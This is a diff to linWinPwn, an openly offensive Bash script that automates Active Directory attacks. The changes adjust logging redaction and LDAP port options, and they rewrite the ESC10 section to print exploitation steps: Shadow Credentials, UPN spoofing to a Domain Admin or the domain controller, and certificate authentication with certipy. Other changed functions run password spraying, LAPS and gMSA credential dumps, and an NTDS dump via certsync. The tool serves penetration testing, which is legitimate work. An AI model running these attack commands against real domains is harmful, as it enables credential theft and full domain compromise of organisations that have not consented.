@@ -151,7 +151,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.2.8 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.2.9 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -326,8 +326,16 @@ done
 set -- "${args[@]}"
 
 run_command() {
-    echo "$(date +%Y-%m-%d\ %H:%M:%S); $*" | sed -e "s/$password$hash$aeskey/********/g" 2>/dev/null >>"$command_log"
-    echo -e "${YELLOW}[i]${NC} Running command: $*\n" | sed -e "s/$password$hash$aeskey/********/g" 2>/dev/null > /dev/tty
+    pattern="${password}${hash}${aeskey}"
+    if [ -n "$pattern" ]; then
+        escaped=$(printf '%s' "$pattern" | sed 's/[][\\/.*^$]/\\&/g')
+        sed_expr="s/${escaped}/********/g"
+        echo "$(date '+%F %T'); $*" | sed -e "$sed_expr" 2>/dev/null >> "$command_log"
+        echo -e "${YELLOW}[i]${NC} Running command: $*\n" | sed -e "$sed_expr" 2>/dev/null > /dev/tty
+    else
+        echo "$(date '+%F %T'); $*" >> "$command_log"
+        echo -e "${YELLOW}[i]${NC} Running command: $*\n" > /dev/tty
+    fi
     /usr/bin/script -qc "$@" /dev/null
 }
 
@@ -1902,7 +1910,7 @@ certipy_enum() {
                 if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-signing"; fi
             fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapbindsign_param} -stdout" >"${ADCS_dir}/certipy_output_${user_var}.txt"
+            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapbindsign_param} -stdout"  | tee "${ADCS_dir}/certipy_output_${user_var}.txt"
             run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapbindsign_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 | tee -a "${ADCS_dir}/certipy_vulnerable_output_${user_var}.txt"
             cd "${current_dir}" || exit
         fi
@@ -2026,25 +2034,23 @@ adcs_vuln_parse() {
         done
     fi
 
-    esc10_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC10") | ."CA Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u | sed "s/ /SPACE/g")
-    if [[ -n $esc10_vuln ]]; then
-        echo -e "\n${GREEN}[+] ESC10 vulnerability potentially found! Follow steps below for exploitation:${NC}"
-        for vulnca in $esc10_vuln; do
-            echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
-            echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
-            echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${CYAN}2. Change userPrincipalName of second_user to Domain Admin or DC (UPN spoofing):${NC}"
-            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn ${dc_NETBIOS}\\\$@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${CYAN}3. Request certificate permitting client authentication as second_user:${NC}"
-            echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -ca \"${vulnca//SPACE/ }\" -template [ User ] -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
-            echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${CYAN}5. Authenticate using pfx of Domain Admin or DC:${NC}"
-            echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
-            echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -dc-ip ${dc_ip} ${ldaps_param}"
-        done
-    fi
+    echo -e "\n${YELLOW}[!] Manually check for ESC10 vulnerability by querying the registry:${NC}"
+    echo -e "reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL"
+    echo -e "CertificateMappingMethods    REG_DWORD    0x4 ${GREEN}<== VULNERABLE${NC} "
+    echo -e "${YELLOW}[!] If vulnerable to ESC10, follow steps below for exploitation:${NC}"
+    echo -e "${BLUE}# \"${pki_cas//SPACE/ }\" certificate authority${NC}"
+    echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
+    echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
+    echo -e "${CYAN}2. Change userPrincipalName of second_user to Domain Admin or DC (UPN spoofing):${NC}"
+    echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
+    echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn ${dc_NETBIOS}\\\$@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
+    echo -e "${CYAN}3. Request certificate permitting client authentication as second_user:${NC}"
+    echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -ca \"${pki_cas//SPACE/ }\" -template [ User ] -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
+    echo -e "${CYAN}4. Change second_user's UPN back:${NC}"
+    echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn <second_user>@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
+    echo -e "${CYAN}5. Authenticate using pfx of Domain Admin or DC:${NC}"
+    echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
+    echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -dc-ip ${dc_ip} ${ldaps_param}"
 
     esc11_vuln=$(/usr/bin/jq -r '."Certificate Authorities"[] | select (."[!] Vulnerabilities"."ESC11") | ."CA Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u | sed "s/ /SPACE/g")
     if [[ -n $esc11_vuln ]]; then
@@ -2239,7 +2245,7 @@ certsync_ntds_dump() {
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-            run_command "${certsync} ${argument_certsync} -dc-ip ${dc_ip} ${dnstcp_bool} -ns ${dns_ip} ${ldaps_param} -kdcHost ${dc_FQDN} -outputfile ${Credentials_dir}/certsync_${user_var}.txt"
+            run_command "${certsync} ${argument_certsync} -dc-ip ${dc_ip} ${dnstcp_param} -ns ${dns_ip} ${ldaps_param} -kdcHost ${dc_FQDN} -outputfile ${Credentials_dir}/certsync_${user_var}.txt"
         fi
     fi
     echo -e ""
@@ -2505,7 +2511,7 @@ ne_passpray() {
         read -rp ">> " passpray_password </dev/tty
     done
     echo -e "${YELLOW}[i] Password spraying with password ${passpray_password}. This may take a while...${NC}"
-    run_command "${netexec} ${ne_verbose} ldap ${target} -u ${target_userslist} -p ${passpray_password} --no-bruteforce --continue-on-success --log ${BruteForce_dir}/ne_passpray_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} -u ${target_userslist} -p ${passpray_password} --no-bruteforce --continue-on-success --log ${BruteForce_dir}/ne_passpray_output_${dc_domain}.txt" 2>&1
     grep "\[+\]" "${BruteForce_dir}/ne_passpray_output_${dc_domain}.txt" | cut -d "\\" -f 2 | cut -d " " -f 1 >"${BruteForce_dir}/passpray_valid_ne_${dc_domain}.txt"
     if [ -s "${BruteForce_dir}/passpray_valid_ne_${dc_domain}.txt" ]; then
         echo -e "${GREEN}[+] Printing accounts with password ${passpray_password}...${NC}"
@@ -3228,7 +3234,7 @@ findunusess_check() {
 
 badsuccessor_check() {
     echo -e "${BLUE}[*] Running BadSuccessor check against domain${NC}"
-    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} -M badsuccessor --log ${Vulnerabilities_dir}/ne_badsuccessor_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M badsuccessor --log ${Vulnerabilities_dir}/ne_badsuccessor_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -4015,7 +4021,7 @@ juicycreds_dump() {
 
 laps_dump() {
     echo -e "${BLUE}[*] LAPS Dump${NC}"
-    run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} -M laps --kdcHost ${dc_FQDN} --log ${Credentials_dir}/laps_dump_${user_var}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} -M laps --kdcHost ${dc_FQDN} --log ${Credentials_dir}/laps_dump_${user_var}.txt" 2>&1
     echo -e ""
 }
 
@@ -4024,7 +4030,7 @@ gmsa_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] gMSA Dump requires credentials${NC}"
     else
-        run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} --gmsa --log ${Credentials_dir}/gMSA_dump_${user_var}.txt" 2>&1
+        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --gmsa --log ${Credentials_dir}/gMSA_dump_${user_var}.txt" 2>&1
     fi
     echo -e ""
 }
@@ -4663,7 +4669,7 @@ pkinit_auth() {
 get_domain_sid() {
     sid_domain=$(grep -o "Domain SID.*" "${DomainRecon_dir}/ne_sid_output_${dc_domain}.txt" 2>/dev/null | head -n 1 | cut -d " " -f 3)
     if [[ ${sid_domain} == "" ]]; then
-        run_command "${netexec} ldap ${target} ${argument_ne} --get-sid | tee ${DomainRecon_dir}/ne_sid_output_${dc_domain}.txt" >/dev/null
+        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --get-sid | tee ${DomainRecon_dir}/ne_sid_output_${dc_domain}.txt" >/dev/null
         sid_domain=$(grep -o "Domain SID.*" "${DomainRecon_dir}/ne_sid_output_${dc_domain}.txt" 2>/dev/null | head -n 1 | cut -d " " -f 3)
     fi
     echo -e "${YELLOW}[i]${NC} SID of Domain: ${YELLOW}${sid_domain}${NC}"
